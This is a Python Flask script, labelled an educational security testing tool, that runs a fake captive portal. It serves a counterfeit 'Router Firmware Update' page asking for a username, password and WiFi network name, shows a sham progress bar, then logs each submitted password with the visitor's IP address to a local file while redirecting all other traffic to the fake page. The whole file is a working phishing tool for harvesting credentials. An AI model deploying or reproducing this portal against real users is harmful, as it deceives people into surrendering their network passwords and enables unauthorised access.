#!/usr/bin/env python3
"""
Captive Portal - Flask Web Server
Educational Security Testing Tool
"""

from flask import Flask, request, render_template, render_template_string, redirect
import datetime
import os
from pathlib import Path

# Configuration
SCRIPT_DIR = Path(__file__).parent.absolute()
LOG_FILE = SCRIPT_DIR / "log.txt"
TEMPLATES_DIR = SCRIPT_DIR / "templates"

app = Flask(__name__, template_folder=str(TEMPLATES_DIR))

# HTML Template for Fake Router Login Page
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .header p {
            color: #666;
            font-size: 14px;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 32px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .alert {
            background: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            display: none;
        }
        .alert.show {
            display: block;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        .progress {
            display: none;
            margin-top: 20px;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s;
        }
        .progress-text {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">📡</div>
            <h1>Router Firmware Update</h1>
            <p>A firmware update is required to continue</p>
        </div>
        
        <div class="alert" id="alert">
            Please enter both username and password
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="username">Username / Email</label>
                <input type="text" id="username" name="username" placeholder="Enter username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" required>
            </div>
            
            <div class="form-group">
                <label for="ssid">Network Name (SSID)</label>
                <input type="text" id="ssid" name="ssid" placeholder="WiFi network name" required>
            </div>
            
            <button type="submit" class="btn">Update Firmware</button>
        </form>
        
        <div class="progress" id="progress">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">Updating firmware... 0%</div>
        </div>
        
        <div class="footer">
            <p>© 2024 Router Management System</p>
            <p>For assistance, contact your network administrator</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const ssid = document.getElementById('ssid').value;
            
            if (!username || !password || !ssid) {
                document.getElementById('alert').classList.add('show');
                return;
            }
            
            document.getElementById('alert').classList.remove('show');
            document.getElementById('progress').style.display = 'block';
            
            let progress = 0;
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            const interval = setInterval(() => {
                progress += 10;
                progressFill.style.width = progress + '%';
                progressText.textContent = 'Updating firmware... ' + progress + '%';
                
                if (progress >= 100) {
                    clearInterval(interval);
                    progressText.textContent = 'Update complete!';
                    
                    setTimeout(() => {
                        this.submit();
                    }, 1000);
                }
            }, 300);
        });
    </script>
</body>
</html>
"""

SUCCESS_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected - Yashraj's World</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 50%, #0a0a1a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            background: rgba(0, 255, 255, 0.3);
            animation: float 15s infinite;
            pointer-events: none;
        }
        
        @keyframes float {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.3;
            }
            50% {
                transform: translateY(-100px) rotate(180deg);
                opacity: 0.8;
            }
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }
        
        .neon-text {
            font-family: 'Orbitron', sans-serif;
            text-shadow: 
                0 0 10px rgba(0, 255, 255, 0.8),
                0 0 20px rgba(0, 255, 255, 0.6),
                0 0 30px rgba(0, 255, 255, 0.4);
        }
        
        .cyber-lime {
            color: #84cc16;
            text-shadow: 0 0 10px rgba(132, 204, 22, 0.6);
        }
        
        .electric-blue {
            color: #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
        }
        
        .neon-purple {
            color: #a855f7;
            text-shadow: 0 0 10px rgba(168, 85, 247, 0.6);
        }
        
        .neon-button {
            background: linear-gradient(135deg, #00ffff, #a855f7);
            border: none;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 
                0 0 20px rgba(0, 255, 255, 0.4),
                0 0 40px rgba(168, 85, 247, 0.2);
            text-decoration: none;
            display: inline-block;
            padding: 14px 30px;
        }
        
        .neon-button:hover {
            transform: translateY(-2px);
            box-shadow: 
                0 0 30px rgba(0, 255, 255, 0.6),
                0 0 60px rgba(168, 85, 247, 0.4);
        }
        
        @keyframes pulse {
            0%, 100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.8;
                transform: scale(1.05);
            }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <!-- Animated Background Particles -->
    <div class="particle" style="width: 100px; height: 100px; top: 10%; left: 10%;"></div>
    <div class="particle" style="width: 60px; height: 60px; top: 60%; left: 80%; animation-delay: -5s;"></div>
    <div class="particle" style="width: 80px; height: 80px; top: 80%; left: 20%; animation-delay: -10s;"></div>
    <div class="particle" style="width: 40px; height: 40px; top: 30%; left: 70%; animation-delay: -7s;"></div>
    <div class="particle" style="width: 120px; height: 120px; top: 50%; left: 50%; animation-delay: -3s;"></div>

    <div class="w-full max-w-md mx-auto">
        <!-- Hero Section -->
        <div class="text-center mb-8">
            <h1 class="text-4xl md:text-5xl font-bold neon-text electric-blue mb-2">
                Welcome to
            </h1>
            <h2 class="text-3xl md:text-4xl font-bold neon-text neon-purple">
                Yashraj's World
            </h2>
        </div>

        <!-- Glass Success Card -->
        <div class="glass-card p-8 text-center">
            <div class="text-6xl mb-4 cyber-lime pulse">✓</div>
            <h3 class="text-2xl font-bold text-white mb-3 neon-text">Connected!</h3>
            <p class="text-gray-400 mb-6">You are now connected to the network</p>
            
            <a href="http://www.google.com" class="neon-button">
                <span class="flex items-center justify-center gap-2">
                    <span>🌐</span>
                    <span>Continue to Internet</span>
                </span>
            </a>
            
            <div class="mt-6 pt-6 border-t border-gray-700/50">
                <p class="text-gray-500 text-xs">
                    <span class="cyber-lime">🔒</span> Secured by Yashraj's Network
                </p>
            </div>
        </div>
    </div>
</body>
</html>
"""

def log_credentials(password, client_ip):
    """Log captured WiFi password to file"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] WiFi Password: {password} | Client IP: {client_ip}\n"
    
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        print(f"[+] WiFi password logged from {client_ip}")
    except Exception as e:
        print(f"[!] Failed to log credentials: {e}")

@app.route('/')
def index():
    """DNS Sinkhole - All requests redirect to login page"""
    client_ip = request.remote_addr
    print(f"[*] Request from {client_ip} redirected to login page")
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle login form submission"""
    if request.method == 'POST':
        password = request.form.get('password', '')
        client_ip = request.remote_addr
        
        # Log the WiFi password
        log_credentials(password, client_ip)
        
        # Show success page
        return render_template_string(SUCCESS_HTML)
    
    return redirect('/')

@app.route('/<path:path>')
def catch_all(path):
    """Catch all other routes and redirect to login"""
    return redirect('/')

if __name__ == '__main__':
    # Ensure log file exists
    if not LOG_FILE.exists():
        LOG_FILE.touch()
    
    # Ensure templates directory exists
    TEMPLATES_DIR.mkdir(exist_ok=True)
    
    print("="*50)
    print("CAPTIVE PORTAL STARTED")
    print("="*50)
    print(f"[+] Running on http://0.0.0.0:80")
    print(f"[+] Credentials log: {LOG_FILE}")
    print("[+] All DNS requests redirected to login page")
    print("="*50)
    
    # Run Flask on port 80 (requires root)
    app.run(host='0.0.0.0', port=80, debug=False)
